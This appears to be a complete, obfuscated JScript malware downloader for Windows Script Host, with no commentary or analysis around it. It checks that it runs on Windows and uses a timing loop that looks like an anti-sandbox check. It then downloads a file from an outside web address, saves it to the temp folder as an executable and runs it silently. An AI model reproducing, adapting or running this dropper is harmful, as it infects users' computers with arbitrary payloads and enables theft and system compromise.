var _BM = false;
var _X = "CreateObject";
var _NC = function _NG() {return WScript[_X]("WScript"+".Shell");}(), _FW = 11;
var _F = "MSXML2.XMLHTTP";
var _K = 2123213;
var _TX = 0;
function _HX(_S){_NC["Run"](_S, _TX, _TX);};
function _BJ(){return _F + "";};
function _FB(_D0, _CO){_TX = _TX * 1; return _D0 - _CO;};
function _Q(){return _X;};
/*@cc_on
  @if (@_win32 || @_win64)
    _BM = true;
  @end
@*/
if (_BM)
{
var _EL = "";
function _N(){return 22;};
var _CU = 0; var _C = 0;
function _RQ()
{
var _CR = new this["Date"]();
var _QJ = _CR["getUTCMilliseconds"]();
WScript["Sleep"](_N());
var _CR = new this["Date"]();
var _E = _CR["getUTCMilliseconds"]();
WScript["Sleep"](_N());
var _CR = new this["Date"]();
var _E0 = _CR["getUTCMilliseconds"]();
var _CU = "_VE";
_CU = _FB(_E, _QJ);
var _C = "_MY";
_C = _FB(_E0, _E);
_EL = "open";
return _FB(_CU, _C);
}
var _D = false;
var _XK = false;
for (var _A = _TX; _A < _N() * 1; _A++){if (_RQ() != _TX){
_D = true; 
_C = "31" + 11 * _CU + _C; 
_XK = true; 
break;
}}
function _OQ() {return ((_D == true) && (_D == _XK)) ? 1 : _TX;};
if (_D && _OQ() && _XK){
function _J() {return _NC["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "UnY5Ao01Js.ex" + "e";};
 _N0 = _BJ();
 _J0 = WScript[_X](_N0);
 var _L = 1;
 while (_L){
try {
	if (_L == 1)
	{
		_J0[_EL]("GET", "http://pro.monbento.com/n3iska", false);
		_J0["send"]();
		_AC = "Sleep";
	}
	WScript[_AC](_N() + 120); 
	if (_J0["readystate"] < 2 * 2) continue;
	_L = _TX;
	function _SO(_IQ) {var _WB = (1, 2, 3, 4, 5, _IQ); return _WB;};
	_U = WScript[_Q()]("ADODB.Stream");
	_N0 = _U;
	_N0[_EL]();
	_N0["type"] = _SO(1);
	_N0["write"](_J0["ResponseBody"]);
	_U["position"] = _SO(_TX);
	_N0["Save" + "ToFile"](_J(), 2);
	_U["cl"+"ose"]();
	_TR = _J();
	_HX(_TR);
} catch(_LJ){};
}
}
}

